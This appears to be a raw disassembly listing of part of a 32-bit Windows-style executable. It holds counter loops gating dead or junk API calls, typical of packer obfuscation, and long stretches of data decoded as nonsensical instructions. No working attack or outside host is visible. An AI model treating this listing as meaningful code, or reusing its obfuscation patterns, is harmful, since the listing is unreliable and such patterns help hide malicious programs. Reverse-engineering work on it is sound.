  40ec29:	xor    bl,BYTE PTR [ebx+0x6b698f47]
  40ec2f:	inc    ebx
  40ec30:	dec    eax
  40ec31:	inc    BYTE PTR [edx]
  40ec33:	sub    BYTE PTR [eax+0x46],al
  40ec36:	dec    edx
  40ec37:	imul   ecx,ebp,0x63e94efa
  40ec3d:	sub    dl,BYTE PTR [ecx-0x72]
  40ec40:	jle    0x40ebd6
  40ec42:	dec    edx
  40ec43:	fld    QWORD PTR [eax]
  40ec45:	push   edx
  40ec46:	push   ss
  40ec47:	and    ebx,ecx
  40ec49:	dec    edi
  40ec4a:	call   0x2b9b582b
  40ec4f:	sbb    al,0x7
  40ec51:	adc    al,0x51
  40ec53:	pop    esp
  40ec54:	add    eax,0x5262bff4
  40ec59:	push   edi
  40ec5a:	pop    ebx
  40ec5b:	add    eax,0x6939a3fd
  40ec60:	cmp    DWORD PTR [ebx+0x25],0x55
  40ec64:	ret    0x9a5d
  40ec67:	inc    eax
  40ec68:	dec    ecx
  40ec69:	imul   esi,DWORD PTR [ebp+0x9],0xffffffab
  40ec6d:	push   ebx
  40ec6e:	push   cs
  40ec6f:	mov    bl,0xac
  40ec71:	fstp   QWORD PTR [edx+ebx*4+0x4862cc91]
  40ec78:	xlat   BYTE PTR ds:[ebx]
  40ec79:	or     bh,dh
  40ec7b:	pop    eax
  40ec7c:	out    0x2f,eax
  40ec7e:	dec    ebp
  40ec7f:	test   al,0x65
  40ec81:	fld    DWORD PTR [edx+0xf856f9f]
  40ec87:	adc    edx,DWORD PTR [ebp+0x2f4400d3]
  40ec8d:	jno    0x40ec3d
  40ec8f:	cld    
  40ec90:	mov    ecx,DWORD PTR [ebx-0x599fa74]
  40ec96:	iret   
  40ec97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ec98:	mov    DWORD PTR [ebx+0xd0b0855],ecx
  40ec9e:	jge    0x40ec47
  40eca0:	inc    edx
  40eca1:	add    BYTE PTR [ecx+0x50b8c045],cl
  40eca7:	or     BYTE PTR [ecx+0x7],dl
  40ecaa:	xor    edx,eax
  40ecac:	add    edi,0x2fd0
  40ecb2:	mov    ecx,0x327298
  40ecb7:	mov    DWORD PTR ds:0x42a879,0x17
  40ecc1:	cmp    DWORD PTR ds:0x42a879,0x0
  40ecc8:	je     0x40ed80
  40ecce:	cmp    DWORD PTR ds:0x42a879,0x5
  40ecd5:	jne    0x40ecf1
  40ecdb:	push   DWORD PTR [ebp-0x1c]
  40ecde:	push   0x65c1
  40ece3:	push   DWORD PTR [ebp-0x20]
  40ece6:	push   0x6120
  40eceb:	call   DWORD PTR ds:0x41d254
  40ecf1:	cmp    DWORD PTR ds:0x42a879,0x6
  40ecf8:	jne    0x40ed0b
  40ecfe:	mov    edi,DWORD PTR ds:0x42a879
  40ed04:	dec    edi
  40ed05:	mov    DWORD PTR ds:0x42a879,edi
  40ed0b:	mov    edi,DWORD PTR ds:0x42a879
  40ed11:	dec    edi
  40ed12:	mov    DWORD PTR ds:0x42a879,edi
  40ed18:	jmp    0x40ecc1
  40ed1d:	and    DWORD PTR ds:0x42a885,0x0
  40ed27:	mov    edi,DWORD PTR ds:0x42a885
  40ed2d:	inc    edi
  40ed2e:	mov    DWORD PTR ds:0x42a885,edi
  40ed34:	cmp    DWORD PTR ds:0x42a885,0x5
  40ed3b:	jne    0x40ed53
  40ed41:	push   DWORD PTR [ebp-0xc]
  40ed44:	push   DWORD PTR [ebp-0xc]
  40ed47:	push   DWORD PTR [ebp-0x18]
  40ed4a:	push   DWORD PTR [ebp-0x14]
  40ed4d:	call   DWORD PTR ds:0x41d1a4
  40ed53:	cmp    DWORD PTR ds:0x42a885,0x4
  40ed5a:	jne    0x40ed6d
  40ed60:	mov    edi,DWORD PTR ds:0x42a885
  40ed66:	inc    edi
  40ed67:	mov    DWORD PTR ds:0x42a885,edi
  40ed6d:	cmp    DWORD PTR ds:0x42a885,0x1f
  40ed74:	jb     0x40ed27
  40ed7a:	add    edi,DWORD PTR ds:0x42a7fd
  40ed80:	add    edx,ecx
  40ed82:	mov    edi,DWORD PTR ds:0x42a7f1
  40ed88:	xor    DWORD PTR ds:0x42a875,edi
  40ed8e:	jmp    0x40f016
  40ed93:	retf   0xc5c0
  40ed96:	ror    cl,0xc5
  40ed99:	leave  
  40ed9a:	retf   0x1a17
  40ed9d:	push   edx
  40ed9e:	xchg   edx,eax
  40ed9f:	sbb    eax,0x611fdd22
  40eda4:	mov    edi,0x7ee57878
  40eda9:	js     0x40ee23
  40edab:	xchg   edi,eax
  40edac:	mov    dh,0xc8
  40edae:	mov    ah,0x73
  40edb0:	shr    DWORD PTR [esi],1
  40edb2:	and    eax,0x8d7d64bb
  40edb7:	push   es
  40edb8:	(bad)  
  40edb9:	aaa    
  40edba:	retf   
  40edbb:	add    BYTE PTR [ebp+0x2f0c73b],al
  40edc1:	ror    BYTE PTR [esi+ecx*8-0x5091e032],1
  40edc8:	or     al,0x44
  40edca:	int    0x64
  40edcc:	xor    DWORD PTR [edx+0x1d9a56e6],ebx
  40edd2:	pop    ebp
  40edd3:	sbb    DWORD PTR [esi-0x3f],edi
  40edd6:	cmp    edi,ecx
  40edd8:	xchg   esi,eax
  40edd9:	pushf  
  40edda:	inc    ebp
  40eddb:	enter  0x87b6,0x51
  40eddf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ede0:	inc    esp
  40ede1:	mov    edi,0xe2b9322e
  40ede6:	sbb    ch,bl
  40ede8:	rcl    ch,0x44
  40edeb:	stos   DWORD PTR es:[edi],eax
  40edec:	or     eax,0x7931e5bb
  40edf1:	mov    esp,0xe0f2b447
  40edf6:	dec    esi
  40edf7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40edf8:	out    dx,eax
  40edf9:	loope  0x40edcd
  40edfb:	jmp    0x1a06:0xd0492e18
  40ee02:	mov    ebx,0x7f2c0c19
  40ee07:	leave  
  40ee08:	jmp    0xf256:0xcc886cf8
  40ee0f:	cdq    
  40ee10:	sbb    al,ch
  40ee12:	push   ecx
  40ee13:	int3   
  40ee14:	adc    DWORD PTR [eax-0x593deda5],esp
  40ee1a:	stc    
  40ee1b:	mov    ebp,esi
  40ee1d:	and    DWORD PTR [ebx+0x53f833fc],ecx
  40ee23:	outs   dx,DWORD PTR ds:[esi]
  40ee24:	sub    dl,BYTE PTR [eax-0x1075ee42]
  40ee2a:	retf   0xb454
  40ee2d:	and    eax,0x5a6925dd
  40ee32:	lods   al,BYTE PTR ds:[esi]
  40ee33:	ins    BYTE PTR es:[edi],dx
  40ee34:	mov    DWORD PTR [edi+0x6b],edx
  40ee37:	sub    al,0xc2
  40ee39:	inc    DWORD PTR [ecx-0x56bc73d1]
  40ee3f:	sub    ebx,edi
  40ee41:	xchg   ecx,eax
  40ee42:	sbb    BYTE PTR [ebp-0x52],0xf9
  40ee46:	sbb    ebx,ecx
  40ee48:	je     0x40eebc
  40ee4a:	rcr    BYTE PTR [edx-0x49],0x10
  40ee4e:	sahf   
  40ee4f:	out    dx,eax
  40ee50:	js     0x40eec1
  40ee52:	in     eax,dx
  40ee53:	and    eax,0x106a601f
  40ee58:	mov    cl,0x6
  40ee5a:	or     esp,DWORD PTR [esi+eiz*2-0x190ea0ab]
  40ee61:	mov    al,ds:0xdf7c4bc0
  40ee66:	mov    dh,0xe2
  40ee68:	xchg   edx,eax
  40ee69:	sub    eax,0xa1e2d2cc
  40ee6e:	ss in  eax,0x5d
  40ee71:	adc    ebp,DWORD PTR [eax+0x6d9d2b27]
  40ee77:	call   0x3d47:0x36ea4d4d
  40ee7e:	nop
  40ee7f:	neg    BYTE PTR [ebx+0x474fd256]
  40ee85:	and    al,0xe9
  40ee87:	or     WORD PTR [ebp+0x55],0xde5d
  40ee8d:	dec    ebx
  40ee8e:	cmp    DWORD PTR [edx+0x6c],ecx
  40ee91:	arpl   WORD PTR [ecx+0x53a68271],ax
  40ee97:	mov    ds:0x432d39c7,eax
  40ee9c:	cmp    BYTE PTR [edi],0xed
  40ee9f:	(bad)  [ebx]
  40eea1:	adc    bl,BYTE PTR ds:[esi+0x45]
  40eea5:	pop    edi
  40eea6:	(bad)  
  40eea7:	cmp    DWORD PTR [ebp-0x3fb2dfe2],ebp
  40eead:	ds jne 0x40eec4
  40eeb0:	mov    ebx,0xb9cf675e
  40eeb5:	stos   DWORD PTR es:[edi],eax
  40eeb6:	pop    ds
  40eeb7:	xor    ch,BYTE PTR [ebp+0x56b57f4a]
  40eebd:	pushf  
  40eebe:	xchg   ebx,edx
  40eec0:	sbb    edx,DWORD PTR [edi+edi*1-0x5]
  40eec4:	jo     0x40eea0
  40eec6:	lds    eax,FWORD PTR [esi+0x1b3715e4]
  40eecc:	test   eax,0x68cf985f
  40eed1:	aas    
  40eed2:	mov    edi,0xdcbd7437
  40eed7:	mov    ds:0x3c35694c,eax
  40eedc:	inc    ebx
  40eedd:	aas    
  40eede:	sbb    DWORD PTR [eax-0xe],0xf1a0b03c
  40eee5:	jmp    0xbce7555d
  40eeea:	aad    0xf8
  40eeec:	out    0xf0,eax
  40eeee:	jmp    0x4b8f5ef8
  40eef3:	mov    dl,0xee
  40eef5:	jno    0x40eee6
  40eef7:	mov    ds:0xc353e8c6,al
  40eefc:	aad    0xe0
  40eefe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eeff:	or     BYTE PTR [ecx+0x28],al
  40ef02:	jb     0x40eeee
  40ef04:	ds dec ebx
  40ef06:	sbb    al,0x4e
  40ef08:	mov    edi,0x361e5c04
  40ef0d:	jns    0x40ef07
  40ef0f:	pop    ss
  40ef10:	cmp    DWORD PTR [eax],ebx
  40ef12:	cs pop es
  40ef14:	jbe    0x40eea7
  40ef16:	inc    edi
  40ef17:	sub    DWORD PTR [ebx],ebp
  40ef19:	cmc    
  40ef1a:	push   ebx
  40ef1b:	les    ebp,FWORD PTR [edi-0x46]
  40ef1e:	cs fptan 
  40ef21:	inc    ebx
  40ef22:	adc    eax,DWORD PTR [esi-0x2b]
  40ef25:	xor    ebp,DWORD PTR [ebx+edx*2+0x62f1c951]
  40ef2c:	or     BYTE PTR [ebx],al
  40ef2e:	(bad)
  40ef31:	loope  0x40ef85
  40ef33:	adc    BYTE PTR [esi],ah
  40ef35:	pop    esi
  40ef36:	dec    ebx
  40ef37:	push   ss
  40ef38:	mov    al,ds:0x60e09564
  40ef3d:	inc    esp
  40ef3e:	fs call 0x1bdaf7db
  40ef44:	fwait
  40ef45:	mov    ebx,0xf1c1f2cf
  40ef4a:	lods   al,BYTE PTR ds:[esi]
  40ef4b:	addr16 jmp 0x9c4f:0xc2776c67
  40ef53:	sti    
  40ef54:	mov    ?,eax
  40ef56:	out    dx,eax
  40ef57:	jno    0x40ef6b
  40ef59:	ror    DWORD PTR [ebp-0xb8d4bae],0xc1
  40ef60:	push   ss
  40ef61:	mov    DWORD PTR [edx+ebx*8-0xc35f752],eax
  40ef68:	or     dl,BYTE PTR [ebp+0x17932bb7]
  40ef6e:	je     0x40efac
  40ef70:	adc    eax,0x338bc0b4
  40ef75:	adc    eax,0xb189ea90
  40ef7a:	xchg   esi,eax
  40ef7b:	fwait
  40ef7c:	lock test al,0xc
  40ef7f:	loope  0x40ef96
  40ef81:	xchg   DWORD PTR [ecx+0x6c25a86a],ecx
  40ef87:	loop   0x40ef14
  40ef89:	fnstenv [ebx]
  40ef8b:	push   ds
  40ef8c:	shl    DWORD PTR [edx-0x668bbb99],0xa5
  40ef93:	jns    0x40ef97
  40ef95:	sub    DWORD PTR [edx-0x6f9021dd],0x875edf33
  40ef9f:	dec    edx
  40efa0:	xchg   ebp,eax
  40efa1:	cmp    bl,BYTE PTR [esi-0x2a]
  40efa4:	ss jbe 0x40efa5
  40efa7:	imul   esi,DWORD PTR [edi+ebx*4],0xc928b124
  40efae:	pop    esp
  40efaf:	or     ebp,DWORD PTR [ecx]
  40efb1:	call   0xb3390deb
  40efb6:	xchg   esi,eax
  40efb7:	sbb    esi,esi
  40efb9:	mov    gs,esi
  40efbb:	les    ebp,FWORD PTR [ecx]
  40efbd:	(bad)  
  40efbe:	jge    0x40ef47
  40efc0:	mov    ds:0xa5b9fd3b,eax
  40efc5:	pop    edi
  40efc6:	clc    
  40efc7:	jno    0x40f026
  40efc9:	jge    0x40efcc
  40efcb:	xchg   esp,eax
  40efcc:	outs   dx,BYTE PTR ds:[esi]
  40efcd:	daa    
  40efce:	sub    ah,BYTE PTR ds:0x3cd8bbe7
  40efd4:	xchg   esi,eax
  40efd5:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  40efd7:	cld    
  40efd8:	and    DWORD PTR [ecx+eax*8-0x62],edi
  40efdc:	xor    DWORD PTR [esi+0x29fdcdad],0x4d
  40efe3:	sub    BYTE PTR [edi+ecx*4-0x78],dh
  40efe7:	(bad)  
  40efe8:	test   BYTE PTR [esi+0x6e],al
  40efeb:	jl     0x40f031
  40efed:	dec    esi
  40efee:	add    al,0x7e
  40eff0:	add    dh,BYTE PTR [ebp+0x7ded40e]
  40eff6:	jmp    0x343bf99b
  40effb:	push   cs
  40effc:	call   0x823a192a
  40f001:	xlat   BYTE PTR ds:[ebx]
  40f002:	retf   0x4ad6
  40f005:	jmp    0x5888b079
  40f00a:	es leave 
  40f00c:	shl    edx,0x3b
  40f00f:	add    BYTE PTR [edi-0x3b],dh
  40f012:	xchg   edi,eax
  40f013:	jle    0x40efeb
  40f015:	pop    ecx
  40f016:	mov    DWORD PTR [ebp-0x8],edx
  40f019:	and    DWORD PTR ds:0x42a801,0x0
  40f023:	xor    edi,edi
  40f025:	add    edi,DWORD PTR ds:0x42a801
  40f02b:	inc    edi
  40f02c:	mov    DWORD PTR ds:0x42a801,edi
  40f032:	cmp    DWORD PTR ds:0x42a801,0xa
  40f039:	jne    0x40f04a
  40f03f:	push   0x23fa
  40f044:	call   DWORD PTR ds:0x41d0d0
  40f04a:	cmp    DWORD PTR ds:0x42a801,0x9
  40f051:	jne    0x40f066
  40f057:	xor    edi,edi
  40f059:	or     edi,DWORD PTR ds:0x42a801
  40f05f:	inc    edi
  40f060:	mov    DWORD PTR ds:0x42a801,edi
  40f066:	cmp    DWORD PTR ds:0x42a801,0x10
  40f06d:	jb     0x40f023
  40f073:	and    edi,edi
  40f075:	mov    edx,DWORD PTR [ebp+0x8]
  40f078:	and    DWORD PTR ds:0x42a88d,0x0
  40f082:	mov    edi,DWORD PTR ds:0x42a88d
  40f088:	inc    edi
  40f089:	mov    DWORD PTR ds:0x42a88d,edi
  40f08f:	cmp    DWORD PTR ds:0x42a88d,0x29
  40f096:	jne    0x40f0ac
  40f09c:	push   0x42a805
  40f0a1:	push   0x4a20
  40f0a6:	call   DWORD PTR ds:0x41d0d4
  40f0ac:	cmp    DWORD PTR ds:0x42a88d,0x1f
  40f0b3:	jb     0x40f082
  40f0b9:	and    DWORD PTR ds:0x42a759,0x6b84
  40f0c3:	xor    edx,eax
  40f0c5:	jmp    0x40f34d
  40f0ca:	enter  0xcbc4,0xc2
  40f0ce:	fcmovnb st,st(1)
  40f0d0:	aad    0xda
  40f0d2:	push   cs
  40f0d3:	and    al,0x97
  40f0d5:	cmp    al,0x29
  40f0d7:	fild   WORD PTR [edi+eiz*8]
  40f0da:	into   
  40f0db:	mov    esp,0x7ee57878
  40f0e0:	js     0x40f15a
  40f0e2:	inc    ebp
  40f0e3:	std    
  40f0e4:	mov    ch,0x3d
  40f0e6:	ins    DWORD PTR es:[edi],dx
  40f0e7:	div    BYTE PTR [ecx-0x70]
  40f0ea:	fmul   QWORD PTR [ebp+0x1b]
  40f0ed:	mov    ds:0xc09c813,eax
  40f0f2:	fcmove st,st(6)
  40f0f4:	jae    0x40f0c0
  40f0f6:	push   ebp
  40f0f7:	cwde   
  40f0f8:	or     eax,0x9a202a4e
  40f0fd:	adc    al,0x91
  40f0ff:	pop    esi
  40f100:	jl     0x40f181
  40f102:	clc    
  40f103:	xor    dh,cl
  40f105:	adc    DWORD PTR [eax-0x4b2f13ac],0xa774c5c6
  40f10f:	and    ebx,edx
  40f111:	xchg   ecx,eax
  40f112:	ja     0x40f169
  40f114:	cmp    al,0xc7
  40f116:	in     eax,0x17
  40f118:	sahf   
  40f119:	mov    ds:0x4364d959,al
  40f11e:	fwait
  40f11f:	imul   edi,DWORD PTR [edx-0x40],0xc289e93b
  40f126:	mov    ebx,0x7772c6c1
  40f12b:	les    ecx,FWORD PTR [ecx-0x23]
  40f12e:	jbe    0x40f17b
  40f130:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f131:	test   eax,0xf53e6a83
  40f136:	aad    0xaf
  40f138:	jno    0x40f0d9
  40f13a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f13b:	xor    eax,DWORD PTR [ebx]
  40f13d:	mov    edx,0xd14fff38
  40f142:	push   ebp
  40f143:	cwde   
  40f144:	add    DWORD PTR [ebp-0x9],esp
  40f147:	cmp    eax,DWORD PTR [esi+0x3]
  40f14a:	pop    ecx
  40f14b:	mov    ecx,gs
  40f14d:	and    bl,BYTE PTR [edx-0x741447c8]
  40f153:	mov    bl,0x3e
  40f155:	data16 sar BYTE PTR [edi+0x3d9cb1af],cl
  40f15c:	ret    
  40f15d:	cmp    BYTE PTR [ecx+0x35534eb7],0x58
  40f164:	das    
  40f165:	(bad)  
  40f166:	xchg   esp,eax
  40f167:	cmp    eax,0xedb38f11
  40f16c:	mov    al,0xb7
  40f16e:	mov    edi,0x595446cc
  40f173:	sbb    ch,dl
  40f175:	iret   
  40f176:	popf   
  40f177:	push   cs
  40f178:	scas   eax,DWORD PTR es:[edi]
  40f179:	pop    ss
  40f17a:	sub    esi,DWORD PTR [eax]
  40f17c:	dec    edx
  40f17d:	pop    eax
  40f17e:	lods   eax,DWORD PTR ds:[esi]
  40f17f:	loop   0x40f1e2
  40f181:	jecxz  0x40f134
  40f183:	(bad)  
  40f185:	pop    ebp
  40f186:	enter  0xa5fd,0xdb
  40f18a:	rol    DWORD PTR [eax+0x68f67fc7],0xb2
  40f191:	int3   
  40f192:	mov    ebx,0x61fac258
  40f197:	vmwrite ebx,DWORD PTR [edx]
  40f19a:	outs   dx,BYTE PTR ds:[esi]
  40f19b:	pop    ebp
  40f19c:	cmp    DWORD PTR [esi+ebp*1],esi
  40f19f:	and    DWORD PTR [edx+edi*8],edx
  40f1a2:	add    bl,dl
  40f1a4:	stos   BYTE PTR es:[edi],al
  40f1a5:	pop    es
  40f1a6:	sub    eax,0xffda96
  40f1ab:	adc    BYTE PTR [esi],dl
  40f1ad:	enter  0x7417,0xe7
  40f1b1:	(bad)  
  40f1b2:	xlat   BYTE PTR ds:[ebx]
  40f1b3:	pushf  
  40f1b4:	in     al,0x97
  40f1b6:	mov    ebp,DWORD PTR [edi]
  40f1b8:	ins    BYTE PTR es:[edi],dx
  40f1b9:	mov    esi,0x60b8dd05
  40f1be:	push   cs
  40f1bf:	adc    al,0xd3
  40f1c1:	add    DWORD PTR [edx+eiz*1+0x3e107189],edx
  40f1c8:	cli    
  40f1c9:	adc    eax,0xe55154d3
  40f1ce:	and    bh,BYTE PTR [ebp-0x707ef290]
  40f1d4:	xchg   ecx,eax
  40f1d5:	adc    al,0x3
  40f1d7:	xchg   bl,dh
  40f1d9:	les    ebp,FWORD PTR [edx-0x7d]
  40f1dc:	lahf   
  40f1dd:	and    DWORD PTR ds:0x37ceee46,ecx
  40f1e3:	push   0xe2bf3153
  40f1e8:	stos   BYTE PTR es:[edi],al
  40f1e9:	mov    bx,0x2c1d
  40f1ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f1ee:	in     al,0xdc
  40f1f0:	(bad)  
  40f1f1:	stc    
  40f1f2:	repz push edi
  40f1f4:	popa   
  40f1f5:	imul   esp,DWORD PTR [ebx+0x69],0xffffffbf
  40f1f9:	in     eax,dx
  40f1fa:	shl    BYTE PTR [edx],0x96
  40f1fd:	inc    esp
  40f1fe:	sbb    DWORD PTR [ecx],esi
  40f200:	adc    al,0x13
  40f202:	scas   al,BYTE PTR es:[edi]
  40f203:	mov    ds:0xdcfb318b,eax
  40f208:	jp     0x40f206
  40f20a:	cmc    
  40f20b:	shl    DWORD PTR [edi+0x55],cl
  40f20e:	test   eax,0xadfc69cb
  40f213:	sahf   
  40f214:	jno    0x40f23c
  40f216:	shr    cl,0x5b
  40f219:	arpl   WORD PTR [ebx],bx
  40f21b:	dec    ebx
  40f21c:	xor    eax,0x462a4e5e
  40f221:	pushf  
  40f222:	add    bh,bh
  40f224:	push   es
  40f225:	sbb    bl,bl
  40f227:	imul   cl
  40f229:	or     DWORD PTR [ebx+0x2b],ecx
  40f22c:	stos   DWORD PTR es:[edi],eax
  40f22d:	add    eax,0x8d4ce0fb
  40f232:	xchg   DWORD PTR [ebx+eiz*4-0x4e0350f0],ebx
  40f239:	xchg   ebp,eax
  40f23a:	ja     0x40f25f
  40f23c:	dec    esp
  40f23d:	mov    ch,0x87
  40f23f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f240:	add    al,BYTE PTR [eax+0x46]
  40f243:	inc    ebx
  40f244:	inc    esi
  40f245:	mov    ds:0x4a1112a0,eax
  40f24a:	das    
  40f24b:	loope  0x40f22c
  40f24d:	jg     0x40f1ec
  40f24f:	mov    WORD PTR [edi-0xc555d1b],fs
  40f255:	scas   al,BYTE PTR es:[edi]
  40f256:	sbb    al,0x5b
  40f258:	pusha  
  40f259:	stc    
  40f25a:	xor    eax,0xe866c4cd
  40f25f:	sbb    eax,0x2a29e40f
  40f264:	imul   ebx,esp,0xfa3e580c
  40f26a:	ss xor al,0x45
  40f26d:	addr16 retf 0x5b7d
  40f271:	outs   dx,DWORD PTR ds:[esi]
  40f272:	and    DWORD PTR ds:0xf209ebf5,0x7a
  40f279:	cmp    al,0xe7
  40f27b:	inc    ebp
  40f27c:	inc    ecx
  40f27d:	mov    edi,0xb2230cb5
  40f282:	lea    ebp,[ebp+esi*8+0x1b0667e6]
  40f289:	inc    edx
  40f28a:	in     eax,0x79
  40f28c:	imul   ebx,DWORD PTR [eax],0x33
  40f28f:	loope  0x40f29d
  40f291:	cdq    
  40f292:	fidivr DWORD PTR [ecx]
  40f294:	xchg   ebx,eax
  40f295:	xchg   DWORD PTR [ecx],ebx
  40f297:	(bad)  
  40f298:	fsubrp st(1),st
  40f29a:	loop   0x40f220
  40f29c:	pop    esi
  40f29d:	shr    BYTE PTR [edx-0x1dec59fa],cl
  40f2a3:	mov    esi,0x19c08c6b
  40f2a8:	jp     0x40f238
  40f2aa:	outs   dx,DWORD PTR ds:[esi]
  40f2ab:	sub    dh,BYTE PTR ds:0xb044d473
  40f2b1:	arpl   WORD PTR [esi],dx
  40f2b3:	lods   al,BYTE PTR ds:[esi]
  40f2b4:	pop    eax
  40f2b5:	push   ds
  40f2b6:	jecxz  0x40f2b4
  40f2b8:	icebp  
  40f2b9:	mov    al,ds:0x91232e5
  40f2be:	xchg   edi,eax
  40f2bf:	mov    edx,0x5f98cd11
  40f2c4:	or     dh,dh
  40f2c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f2c7:	mov    bl,0x36
  40f2c9:	test   al,0xdf
  40f2cb:	out    0x89,al
  40f2cd:	cmp    eax,eax
  40f2cf:	sti    
  40f2d0:	mov    dh,0x4f
  40f2d2:	push   edx
  40f2d3:	and    esp,DWORD PTR [esi+0xb]
  40f2d6:	cld    
  40f2d7:	lea    esi,[edi-0x52e2629f]
  40f2dd:	fmul   st(6),st
  40f2df:	pop    eax
  40f2e0:	call   0x77b:0x3a3b6c8a
  40f2e7:	(bad)  
  40f2e8:	lods   al,BYTE PTR ds:[esi]
  40f2e9:	push   esp
  40f2ea:	or     dl,dl
  40f2ec:	in     eax,dx
  40f2ed:	push   esi
  40f2ee:	lock jl 0x40f29d
  40f2f1:	sub    eax,0xd53dd425
  40f2f6:	xchg   BYTE PTR [esi],dl
  40f2f8:	fisttp WORD PTR [eax+0x70]
  40f2fb:	or     dl,bh
  40f2fd:	scas   al,BYTE PTR es:[edi]
  40f2fe:	arpl   WORD PTR [edx],ax
  40f300:	gs inc ebp
  40f302:	adc    esi,0x70
  40f305:	pop    esi
  40f306:	in     al,dx
  40f307:	mov    ds,ebp
  40f309:	in     eax,0x4a
  40f30b:	(bad)
  40f30f:	dec    ecx
  40f310:	imul   eax,DWORD PTR [esi],0xffffffeb
  40f313:	and    DWORD PTR [edi],eax
  40f315:	sbb    al,0x8a
  40f317:	mov    ebx,0xb65db485
  40f31c:	popf   
  40f31d:	mov    ebx,0x28b3e781
  40f322:	jo     0x40f33c
  40f324:	cmp    al,ch
  40f326:	jge    0x40f343
  40f328:	cmc    
  40f329:	push   es
  40f32a:	push   ebp
  40f32b:	push   ecx
  40f32c:	int    0xdf
  40f32e:	ret    0x89c9
  40f331:	out    0x1f,al
  40f333:	and    ah,cl
  40f335:	arpl   sp,ax
  40f337:	jle    0x40f36c
  40f339:	push   0xffffff8c
  40f33b:	and    eax,0x834ba86f
  40f340:	bound  edi,QWORD PTR [ecx+0x4b]
  40f343:	lock jno 0x40f361
  40f346:	js     0x40f2ff
  40f348:	ja     0x40f36b
  40f34a:	inc    edx
  40f34b:	pop    es
  40f34c:	push   cs
  40f34d:	add    edx,ecx
  40f34f:	mov    DWORD PTR ds:0x42a80d,0x1d
  40f359:	cmp    DWORD PTR ds:0x42a80d,0x0
  40f360:	je     0x40f3c3
  40f366:	cmp    DWORD PTR ds:0x42a80d,0x7
  40f36d:	jne    0x40f389
  40f373:	push   DWORD PTR [ebp-0x20]
  40f376:	push   DWORD PTR [ebp-0x14]
  40f379:	push   0x7b1d
  40f37e:	push   0x2bb5
  40f383:	call   DWORD PTR ds:0x41d258
  40f389:	cmp    DWORD PTR ds:0x42a80d,0x8
  40f390:	jne    0x40f3a3
  40f396:	mov    edi,DWORD PTR ds:0x42a80d
  40f39c:	dec    edi
  40f39d:	mov    DWORD PTR ds:0x42a80d,edi
  40f3a3:	mov    edi,DWORD PTR ds:0x42a80d
  40f3a9:	dec    edi
  40f3aa:	mov    DWORD PTR ds:0x42a80d,edi
  40f3b0:	jmp    0x40f359
  40f3b5:	xor    edi,edi
  40f3b7:	add    edi,DWORD PTR ds:0x42a759
  40f3bd:	add    DWORD PTR ds:0x42a775,edi
  40f3c3:	mov    DWORD PTR [ebp+0xc],edx
  40f3c6:	xor    edx,DWORD PTR ds:0x42a769
  40f3cc:	mov    DWORD PTR [ebp-0x4],0xf89c85d8
  40f3d3:	or     edx,edx
  40f3d5:	mov    DWORD PTR [ebp-0x28],0xf89c853a
  40f3dc:	and    DWORD PTR ds:0x42a841,0x0
  40f3e6:	jmp    0x40f3f8
  40f3eb:	mov    edx,DWORD PTR ds:0x42a841
  40f3f1:	inc    edx
  40f3f2:	mov    DWORD PTR ds:0x42a841,edx
  40f3f8:	cmp    DWORD PTR ds:0x42a841,0x12
  40f3ff:	jae    0x40f427
  40f405:	cmp    DWORD PTR ds:0x42a841,0x14
  40f40c:	jne    0x40f420
  40f412:	push   0x4578
  40f417:	push   DWORD PTR [ebp-0x14]
  40f41a:	call   DWORD PTR ds:0x41d25c
  40f420:	jmp    0x40f3eb
  40f425:	and    edi,edi
  40f427:	mov    DWORD PTR [ebp-0x2c],0xf89c853b
  40f42e:	sub    edi,DWORD PTR ds:0x42a879
  40f434:	mov    DWORD PTR [ebp-0x30],0xf89c853c
  40f43b:	and    edi,0x6695
  40f441:	mov    DWORD PTR [ebp-0x34],0xf89c853d
  40f448:	or     DWORD PTR ds:0x42a775,0x61f4
  40f452:	mov    DWORD PTR [ebp-0x38],0xf89c853e
  40f459:	and    DWORD PTR ds:0x42a809,0x0
  40f463:	jmp    0x40f477
  40f468:	xor    edx,edx
  40f46a:	xor    edx,DWORD PTR ds:0x42a809
  40f470:	inc    edx
  40f471:	mov    DWORD PTR ds:0x42a809,edx
  40f477:	cmp    DWORD PTR ds:0x42a809,0x11
  40f47e:	jae    0x40f4ac
  40f484:	cmp    DWORD PTR ds:0x42a809,0x1a
  40f48b:	jne    0x40f4a7
  40f491:	push   0x1
  40f493:	push   DWORD PTR [ebp-0xc]
  40f496:	push   DWORD PTR [ebp-0x20]
  40f499:	push   0x1352
  40f49e:	push   DWORD PTR [ebp-0x18]
  40f4a1:	call   DWORD PTR ds:0x41d0d8
  40f4a7:	jmp    0x40f468
  40f4ac:	mov    DWORD PTR [ebp-0x3c],0xf89c853f
  40f4b3:	mov    edx,DWORD PTR [ebp+0x8]
  40f4b6:	xor    edx,eax
  40f4b8:	mov    DWORD PTR ds:0x42a7c9,0x16
  40f4c2:	cmp    DWORD PTR ds:0x42a7c9,0x0
  40f4c9:	je     0x40f553
  40f4cf:	cmp    DWORD PTR ds:0x42a7c9,0x21
  40f4d6:	jne    0x40f4f6
  40f4dc:	push   0x6e96
  40f4e1:	push   0x4a9d
  40f4e6:	push   0x2037
  40f4eb:	push   0x3f81
  40f4f0:	call   DWORD PTR ds:0x41d0dc
  40f4f6:	xor    edi,edi
  40f4f8:	or     edi,DWORD PTR ds:0x42a7c9
  40f4fe:	dec    edi
  40f4ff:	mov    DWORD PTR ds:0x42a7c9,edi
  40f505:	jmp    0x40f4c2
  40f50a:	and    DWORD PTR ds:0x42a841,0x0
  40f514:	jmp    0x40f528
  40f519:	xor    edi,edi
  40f51b:	or     edi,DWORD PTR ds:0x42a841
  40f521:	inc    edi
  40f522:	mov    DWORD PTR ds:0x42a841,edi
  40f528:	cmp    DWORD PTR ds:0x42a841,0x1e
  40f52f:	jae    0x40f553
  40f535:	cmp    DWORD PTR ds:0x42a841,0x26
  40f53c:	jne    0x40f548
  40f542:	call   DWORD PTR ds:0x41d0e0
